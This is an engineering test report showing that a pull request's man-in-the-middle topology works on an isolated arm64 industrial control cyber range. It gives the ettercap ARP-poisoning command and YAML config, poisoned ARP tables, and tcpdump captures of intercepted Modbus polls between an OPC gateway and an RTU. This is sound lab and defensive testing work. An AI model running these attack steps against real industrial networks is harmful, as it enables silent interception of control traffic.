# MITM evidence: PR #31 (`feat-mitm-topology`, `mitm/`) tested on the arm64 range

Bead: ww-585.26. Tests the MITM portion of sceptre-phenix-topologies PR #31, which
mgaliar approved assuming (but not verifying) it had been tested.

## What was built

`topologies/mitm-arm64/` — a derivative of the PR's `mitm/` topology, generated by
`topologies/mitm-arm64/gen_mitm.py` from this repo's `waterway-arm64` topology/scenario
(so it carries our arm64 images, the Linux `opc-arm64.qc2` OPC gateway in place of the
PR's Windows `opc.qc2`, and our Rust `simulinksolver` on the provider, unchanged from
`waterway-arm64/injects/`). The node set matches the PR's mitm topology:

| Host | Image | Role |
|---|---|---|
| `simulink-provider` | bennu-arm64.qc2 | Rust simulinksolver physics provider |
| `opc` | opc-arm64.qc2 | Linux OPC UA gateway, Modbus master polling rtu-1/rtu-2 |
| `rtu-1`, `rtu-2` | bennu-arm64.qc2 | SCEPTRE RTUs (Modbus 502) |
| `router` | minirouter-arm64.qc2 | ICS/SCADA/MGMT router |
| `kali` | kali-arm64.qc2 (ww-585.25) | attacker, runs ettercap |

Regenerate with:
```
cd topologies/mitm-arm64 && uv run --with pyyaml python -I gen_mitm.py
```

`gen_mitm.py` also appends a `scorch` app to the scenario (lifted from burger's
`components/ettercap.yaml` + `components/mitm-capture.yaml`, which implement PR #203's
ettercap component), with `iface: eth0` (the guest's real NIC name — the topology's
`IF0` is a phenix-side label, not what the Linux guest sees) instead of burger's `IF0`:

```yaml
- name: ettercap
  type: ettercap
  metadata: {vms: [{hostname: kali, iface: eth0, targets: "/10.1.1.101// /10.1.1.1//"}]}
- name: mitm-capture
  type: tcpdump
  metadata: {vms: [{hostname: kali, iface: eth0, filter: "tcp port 502"}]}
runs:
  - {name: mitm-start, start: [mitm-capture, ettercap]}
  - {name: mitm-stop,  stop: [ettercap, mitm-capture]}
```

## Why run directly via phenix SCORCH, not burger's ettercap switchboard

Burger's `switchboards/ettercap.yaml` targets `route: waterway` only, and the
`waterway-arm64` route burger already has (ww-585.24) has no mitm variant; adding a
`mitm-arm64` route/board to the everything-burger repo for a one-off bead was more
machinery than the task needed. `phenix experiment scorch <exp> -r <n>` runs the
exact same SCORCH components (`ettercap`, `tcpdump`) that burger's board would drive —
burger just wraps this call with health checks and settle-time retries — so running it
directly is equivalent proof of the MITM mechanism PR #31 depends on. A burger
`mitm-arm64` route is left as follow-up if the project wants burger-driven repeatability
(see Beads/Follow-ups below).

## (1) ARP tables: kali's MAC poisons rtu-1 <-> router

The PR's ettercap component (`phenix_apps/apps/scorch/ettercap/ettercap.py`, from PR
#203) runs `ettercap -Tq -i eth0 -M arp /10.1.1.101// /10.1.1.1//` on kali — i.e. the
intended poisoning pair is **rtu-1 <-> router (10.1.1.1)**, not rtu-1<->opc directly
(opc is routed, off-segment on 10.1.2.0/24). kali's MAC in this run: `24:c0:b3:18:83:27`.

Baseline (before the attack) — real MACs:
```
### rtu-1 11:14:46
10.1.1.1 dev eth0 lladdr 00:e0:28:c2:a3:8c REACHABLE   # router's real MAC

### phenix [=router] 11:15:11
10.1.1.101 dev eth1 lladdr 04:96:45:fe:97:22 REACHABLE # rtu-1's real MAC
```

During the attack (after `phenix experiment scorch mitm -r 0`):
```
### rtu-1 11:17:13
10.1.1.1   dev eth0 lladdr 24:c0:b3:18:83:27 REACHABLE  # <-- kali's MAC, was the router's
10.1.1.200 dev eth0 lladdr 24:c0:b3:18:83:27 STALE      # kali's own entry

### phenix [=router] 11:17:25
10.1.1.101 dev eth1 lladdr 24:c0:b3:18:83:27 REACHABLE  # <-- kali's MAC, was rtu-1's
10.1.1.200 dev eth1 lladdr 24:c0:b3:18:83:27 STALE

### kali 11:17:34
10.1.1.1   dev eth0 lladdr 00:e0:28:c2:a3:8c REACHABLE  # kali's own table: real router MAC
10.1.1.101 dev eth0 lladdr 04:96:45:fe:97:22 REACHABLE  # real rtu-1 MAC (so it can relay)
```

After stopping ettercap (`phenix experiment scorch mitm -r 1`), both rtu-1's and the
router's tables self-healed back to the real MACs (kali's entries went `STALE`), which
confirms the poisoned entries were the attack's effect, not an unrelated artifact:
```
### rtu-1 11:18:44
10.1.1.1   dev eth0 lladdr 00:e0:28:c2:a3:8c REACHABLE  # back to router's real MAC
10.1.1.200 dev eth0 lladdr 24:c0:b3:18:83:27 STALE

### phenix [=router] 11:18:55
10.1.1.101 dev eth1 lladdr 04:96:45:fe:97:22 REACHABLE  # back to rtu-1's real MAC
```

## (2) pcap: opc -> rtu-1 Modbus (port 502) on kali's interface

`kali` is not a Modbus endpoint (neither `opc` nor `rtu-1`), so any port-502 traffic on
its `eth0` is the intercepted OPC-to-rtu-1 polls, relayed through kali by the ARP
poison. Pulled from the stopped SCORCH run (`mitm-capture` writes
`<exp>/files/scorch/run-<n>/mitm-capture/loop-0-count-0/kali-eth0.pcap`) to
`docs/mitm-capture.pcap` (47 KB, captured 04:16:41-04:18:04 UTC, during run 0):

```
$ tcpdump -r mitm-capture.pcap | wc -l
494
$ tcpdump -r mitm-capture.pcap 'src 10.1.2.50 and dst 10.1.1.101' | wc -l   # opc -> rtu-1 requests
324
$ tcpdump -r mitm-capture.pcap 'src 10.1.1.101 and dst 10.1.2.50' | wc -l   # rtu-1 -> opc responses
170
$ tcpdump -r mitm-capture.pcap | head -4
04:16:41.920881 IP 10.1.2.50.43650 > 10.1.1.101.asa-appl-proto: Flags [P.], seq 3187829638:3187829650, ack 2523043691, win 251, [...] length 12
04:16:41.934395 IP 10.1.2.50.43650 > 10.1.1.101.asa-appl-proto: Flags [P.], seq 0:12, ack 1, win 251, [...] length 12
04:16:41.942818 IP 10.1.1.101.asa-appl-proto > 10.1.2.50.43650: Flags [P.], seq 1:26, ack 12, win 509, [...] length 25
04:16:41.947384 IP 10.1.1.101.asa-appl-proto > 10.1.2.50.43650: Flags [P.], seq 1:26, ack 12, win 509, [...] length 25
```
(`asa-appl-proto` is `/etc/services`'s name for TCP port 502, i.e. Modbus; this is the
pcap's own capture filter — `mitm-capture`'s `tcp port {route.ics_port}` resolves to
`tcp port 502`.) 10.1.2.50 is `opc`, 10.1.1.101 is `rtu-1` — traffic between them, seen
on kali's wire, is the MITM proof.

## (3) data path still works during the attack

PR #31's design intercepts and relays Modbus through kali rather than disrupting it
(kali has the real rtu-1/router MACs in its own table, so it forwards). Confirmed:
`opc uaread` (OPC UA client reading the gateway's exposed tags) returned live rtu-1
values while the ARP poison was active, matching baseline-style readings, not errors or
stale data; the OPC-to-rtu-1 TCP session also stayed `ESTABLISHED` throughout:

```
### opc 11:17:51 (baseline sample, 11:14:00-ish)
rtu-1.lock.height = 4.99
-- opc established to rtu-1:502
0 0 10.1.2.50:43650 10.1.1.101:502

### opc 11:17:51 (during the attack)
rtu-1.lock.height = 15.0
rtu-1.lowergate.open = 0.0
rtu-1.lowersensor.active = 0.0
rtu-2.uppergate.open = 0.0
-- opc established to rtu-1:502
0 0 10.1.2.50:43650 10.1.1.101:502
0 0 10.1.2.50:44164 10.1.1.102:502
```
Values differ across samples only because the lock cycle (and simulink physics) keep
moving — the TCP session, polling cadence and successful reads are unaffected by the
MITM, i.e. the attack is a silent interception, not a denial of service, matching the
PR's intent.

## Experiments used

- `mitm` — purpose-built for this test from `topologies/mitm-arm64/`; stopped at the
  end. `waterway` (the 9-VM arm64 range) was never stopped and still showed 9 RUNNING
  VMs with cc clients responding throughout and after this test.

## Conclusion

The MITM portion of PR #31 works as designed on arm64: the ettercap SCORCH component
(PR #203) ARP-poisons the rtu-1 <-> router pair on kali, redirecting OPC's Modbus
polls to rtu-1 through the attacker, where mitm-capture's tcpdump proves the
interception; the data path keeps working (silent MITM, not a DoS). mgaliar's
assumption holds up under test.
